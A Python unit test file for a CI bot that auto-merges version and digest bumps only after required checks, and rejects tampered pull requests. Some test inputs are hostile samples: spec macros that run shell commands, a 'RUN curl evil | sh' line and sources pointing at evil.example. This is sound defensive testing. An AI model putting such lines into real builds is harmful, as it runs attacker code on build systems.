"""Unit tests of forge/scripts/bot_merge.py against a fake gh: a bot pull request of exactly
the bot's shape is merged at its head after the required checks, and every other one, the
bypasses an audit found included, stays for a person
(python3 -B -m unittest discover -s forge/scripts/tests -v)."""

import importlib.util
import json
import os
import pathlib
import tempfile
import unittest

SCRIPT = pathlib.Path(__file__).resolve().parents[1] / "bot_merge.py"
spec = importlib.util.spec_from_file_location("bot_merge", SCRIPT)
bot = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bot)

SHA = "a" * 40
H1, H2 = "1" * 64, "2" * 64
REPO_URL = "https://negativo17.org/repos/nvidia/fedora-43/x86_64/"
LOCK = f"# branch open\n# version 615.71.09\n# repository {REPO_URL}\n{H2}  {REPO_URL}nvidia-driver-615.71.09-5.fc43.x86_64.rpm\n"
FEDORA = "registry.fedoraproject.org/fedora:43"


def patch(removed, added):
    return "\n".join(
        ["@@ -1,3 +1,3 @@", " Name: x"]
        + [f"-{l}" for l in removed]
        + [f"+{l}" for l in added]
    )


def modified(name, removed, added, **kw):
    return dict(
        {"filename": name, "status": "modified", "patch": patch(removed, added)}, **kw
    )


SPEC_FILES = [
    modified(
        "forge/specs/athanor-demo/athanor-demo.spec",
        ["Version:        1.6.0", "Release:        2%{?dist}"],
        ["Version:        1.7.1", "Release:        1%{?dist}"],
    ),
    modified(
        "forge/specs/athanor-demo/SOURCES/sources.sha256",
        [f"{H1}  demo-v1.6.0-amd64.tar.gz"],
        [f"{H2}  demo-v1.7.1-amd64.tar.gz"],
    ),
]
SYSTEM_FILES = [
    modified(
        "system/Containerfile",
        [f"FROM {FEDORA}@sha256:{H1} AS nvidia-rpms"],
        [f"FROM {FEDORA}@sha256:{H2} AS nvidia-rpms"],
    ),
    modified(
        "system/nvidia/locks/open.lock",
        [f"{H1}  {REPO_URL}nvidia-driver-615.71.09-3.fc43.x86_64.rpm"],
        [f"{H2}  {REPO_URL}nvidia-driver-615.71.09-5.fc43.x86_64.rpm"],
    ),
]


class BotMergeTest(unittest.TestCase):
    def setUp(self):
        os.environ["GITHUB_REPOSITORY"] = "owner/repo"
        os.environ.pop("GITHUB_STEP_SUMMARY", None)
        self.cwd = os.getcwd()
        root = pathlib.Path(tempfile.mkdtemp())
        (root / "forge").mkdir()
        watch = [{"repo": "demo/demo", "spec": "specs/athanor-demo/athanor-demo.spec"}]
        (root / bot.WATCH_FILE).write_text(json.dumps(watch))
        os.chdir(root)
        self.runs = [{"id": 1, "status": "completed"}]
        self.jobs = {1: [{"name": "Kernel gate", "conclusion": "success"}]}

    def tearDown(self):
        os.chdir(self.cwd)

    def run_bot(
        self, kind, files, branch, labels=(), build="success", lock=LOCK, **view
    ):
        data = dict(
            state="OPEN",
            headRefName=branch,
            headRefOid=SHA,
            isCrossRepository=False,
            labels=[{"name": l} for l in labels],
            changedFiles=len(files),
        )
        data.update(view)
        self.calls = []

        def gh(*args):
            self.calls.append(args)
            if args[:2] == ("pr", "view"):
                return json.dumps(data)
            if args[0] == "api" and "/files" in " ".join(args):
                return "".join(json.dumps(f) + "\n" for f in files)
            if args[0] == "api" and args[1].startswith(("repos/owner/repo/actions/", "repos/owner/repo/check")):
                return self.actions(args[1])
            if args[0] == "api":
                return lock
            if args[:2] == ("pr", "merge"):
                return ""
            raise AssertionError(args)

        self.assertEqual(bot.main(kind, "7", SHA, build, gh=gh, merge=gh), 0)
        return [c for c in self.calls if c[:2] == ("pr", "merge")]

    def actions(self, endpoint):
        """The Actions API of the fake repository: Kernel Build runs on SHA and their jobs."""
        if endpoint == f"repos/owner/repo/actions/workflows/kernel-build.yml/runs?head_sha={SHA}&event=pull_request":
            return json.dumps({"workflow_runs": self.runs})
        run = int(endpoint.split("/runs/")[1].split("/")[0])
        assert endpoint == f"repos/owner/repo/actions/runs/{run}/jobs?per_page=100", endpoint
        return json.dumps({"jobs": self.jobs[run]})

    def gh_actions(self, *args):
        assert args[0] == "api", args
        return self.actions(args[1])

    def spec(self, files=SPEC_FILES, branch="chore/update-specs-zero-trust", **kw):
        return self.run_bot("spec", files, branch, **kw)

    def system(
        self,
        files=SYSTEM_FILES,
        branch="bump/system-20261003-0200",
        labels=("system-bump",),
        **kw,
    ):
        return self.run_bot("system", files, branch, labels=labels, **kw)

    def with_line(self, files, index, line):
        f = dict(files[index], patch=files[index]["patch"] + "\n" + line)
        return files[:index] + [f] + files[index + 1 :]

    def test_spec_minor_bump_merges_after_required_checks(self):
        self.assertEqual(
            self.spec(), [("pr", "merge", "7", "--squash", "--match-head-commit", SHA)]
        )
        gate = next(i for i, c in enumerate(self.calls) if "/jobs?" in c[1])
        self.assertLess(gate, self.calls.index(self.calls[-1]))
        self.assertEqual(self.calls[-1][:2], ("pr", "merge"))

    def test_spec_major_bump_stays(self):
        for old, new in (("1.9.0", "2.0.0"), ("0.3.1", "0.4.0"), ("0.0.3", "0.0.4")):
            f = dict(
                SPEC_FILES[0],
                patch=SPEC_FILES[0]["patch"]
                .replace("1.6.0", old)
                .replace("1.7.1", new),
            )
            self.assertEqual(self.spec(files=[f]), [])

    def test_spec_zero_major_patch_merges(self):
        f = dict(
            SPEC_FILES[0],
            patch=SPEC_FILES[0]["patch"]
            .replace("1.6.0", "0.3.1")
            .replace("1.7.1", "0.3.2"),
        )
        self.assertNotEqual(self.spec(files=[f]), [])

    def test_spec_macro_in_version_or_release_stays(self):
        for bad in (
            "+Release:        1%(id>/tmp/x)",
            '+Version:        1.7.1%{lua:os.execute("id")}',
        ):
            self.assertEqual(self.spec(files=self.with_line(SPEC_FILES, 0, bad)), [])

    def test_spec_other_line_stays(self):
        for bad in (
            "+%build touch evil",
            "--- gone line",
            "+++ evil line",
            "+Source1: https://evil.example/x",
        ):
            self.assertEqual(self.spec(files=self.with_line(SPEC_FILES, 0, bad)), [])

    def test_path_with_spaces_or_outside_stays(self):
        self.assertEqual(
            self.spec(files=[dict(SPEC_FILES[0], filename="forge/specs/x/a b c.spec")]),
            [],
        )
        self.assertEqual(
            self.spec(
                files=SPEC_FILES + [modified(".github/workflows/x.yml", [], ["evil"])]
            ),
            [],
        )
        self.assertEqual(
            self.spec(
                files=[dict(SPEC_FILES[0], filename="forge/specs/azoth/kernel.spec")]
            ),
            [],
        )
        self.assertEqual(
            self.spec(
                files=[
                    dict(SPEC_FILES[0], filename="forge/specs/athanor-backup/athanor-backup.spec")
                ]
            ),
            [],
        )

    def test_rename_mode_change_binary_stay(self):
        renamed = dict(
            SPEC_FILES[0],
            status="renamed",
            previous_filename=".github/workflows/kernel-build.yml",
            patch="",
        )
        self.assertEqual(self.spec(files=[renamed]), [])
        self.assertEqual(self.spec(files=[dict(SPEC_FILES[0], status="changed")]), [])
        binary = {k: v for k, v in SPEC_FILES[1].items() if k != "patch"}
        self.assertEqual(self.spec(files=[binary]), [])

    def test_wrong_branch_fork_moved_head_or_red_build_stays(self):
        self.assertEqual(self.spec(branch="feature/x"), [])
        self.assertEqual(self.spec(isCrossRepository=True), [])
        self.assertEqual(self.spec(headRefOid="b" * 40), [])
        self.assertEqual(self.spec(state="CLOSED"), [])
        self.assertEqual(self.spec(build="failure"), [])

    def test_system_digest_bump_merges(self):
        self.assertNotEqual(self.system(), [])

    def test_system_without_label_stays(self):
        self.assertEqual(self.system(labels=()), [])

    def test_system_new_image_or_other_line_stays(self):
        f = dict(
            SYSTEM_FILES[0],
            patch=SYSTEM_FILES[0]["patch"].replace(
                f"+FROM {FEDORA}", "+FROM quay.io/evil/image:1"
            ),
        )
        self.assertEqual(self.system(files=[f, SYSTEM_FILES[1]]), [])
        self.assertEqual(
            self.system(files=self.with_line(SYSTEM_FILES, 0, "+RUN curl evil | sh")),
            [],
        )

    def test_system_lock_entry_outside_repository_or_header_change_stays(self):
        self.assertEqual(
            self.system(
                files=self.with_line(
                    SYSTEM_FILES, 1, f"+{H1}  https://evil.example/a.rpm"
                )
            ),
            [],
        )
        self.assertEqual(
            self.system(
                files=self.with_line(SYSTEM_FILES, 1, f"+{H1}  {REPO_URL}sub/a.rpm")
            ),
            [],
        )
        self.assertEqual(
            self.system(files=self.with_line(SYSTEM_FILES, 1, "+# version 620.1")), []
        )

    def test_file_list_shorter_than_the_pull_request_stays(self):
        self.assertEqual(self.spec(changedFiles=3001), [])

    def test_red_gate_fails_without_merging(self):
        self.runs.append({"id": 2, "status": "completed"})
        self.jobs[2] = [{"name": "Kernel gate", "conclusion": "failure"}]
        with self.assertRaises(SystemExit):
            self.spec()
        self.assertFalse([c for c in self.calls if c[:2] == ("pr", "merge")])

    def test_gate_not_reported_yet_is_awaited(self):
        states = [[], [{"id": 1, "status": "queued"}], self.runs]
        slept = []

        def sleep(_):
            slept.append(_)
            self.runs = states[len(slept)]

        self.runs = states[0]
        bot.wait_for_required_check(SHA, self.gh_actions, sleep=sleep)
        self.assertEqual(len(slept), 2)
        self.runs = []
        with self.assertRaises(SystemExit):
            bot.wait_for_required_check(SHA, self.gh_actions, sleep=slept.append, polls=3)

    def test_superseded_green_gate_does_not_count(self):
        # PR #94: a green gate of an earlier Kernel Build on the same commit, and a newer
        # Kernel Build whose gate job does not exist yet. GitHub refuses the merge until the
        # newer gate reports, so the bot waits for it.
        self.runs.append({"id": 2, "status": "in_progress"})
        self.jobs[2] = [{"name": "inputs", "conclusion": None}]
        with self.assertRaises(SystemExit):
            bot.wait_for_required_check(SHA, self.gh_actions, sleep=lambda _: None, polls=3)
        done = []

        def finish(_):
            self.runs[1]["status"] = "completed"
            self.jobs[2] = [{"name": "Kernel gate", "conclusion": "success"}]
            done.append(_)

        bot.wait_for_required_check(SHA, self.gh_actions, sleep=finish)
        self.assertEqual(len(done), 1)
        self.runs[1]["status"] = "completed"
        self.jobs[2] = [{"name": "inputs", "conclusion": "failure"}]
        with self.assertRaises(SystemExit):
            bot.wait_for_required_check(SHA, self.gh_actions, sleep=lambda _: None)


if __name__ == "__main__":
    unittest.main()
